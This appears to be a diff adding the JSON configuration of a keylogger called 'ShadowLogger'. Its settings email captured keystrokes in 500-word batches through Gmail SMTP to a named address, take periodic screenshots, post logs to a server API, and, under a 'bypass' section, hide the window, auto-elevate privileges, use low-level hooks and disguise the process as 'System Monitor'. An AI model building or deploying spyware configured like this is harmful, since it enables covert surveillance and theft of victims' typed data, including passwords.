@@ -1,0 +1,29 @@
+{
+  "email": {
+    "smtp_server": "smtp.gmail.com",
+    "smtp_port": 587,
+    "sender": "renatomfn6@gmail.com",
+    "receiver": "renatomfn6@gmail.com",
+    "username": "renatomfn6@gmail.com",
+    "password": "seu-app-password-aqui",
+    "interval_words": 500,
+    "subject_prefix": "[ShadowLogger]"
+  },
+  "logging": {
+    "log_interval": 300,
+    "screenshot_interval": 300,
+    "max_log_size_mb": 50,
+    "log_dir": "logs"
+  },
+  "bypass": {
+    "hide_window": true,
+    "auto_elevate": true,
+    "trusted_name": "System Monitor",
+    "use_low_level_hooks": true
+  },
+  "server": {
+    "base_url": "http://localhost:5000",
+    "heartbeat_interval": 60,
+    "api_endpoint": "/api/log"
+  }
+}
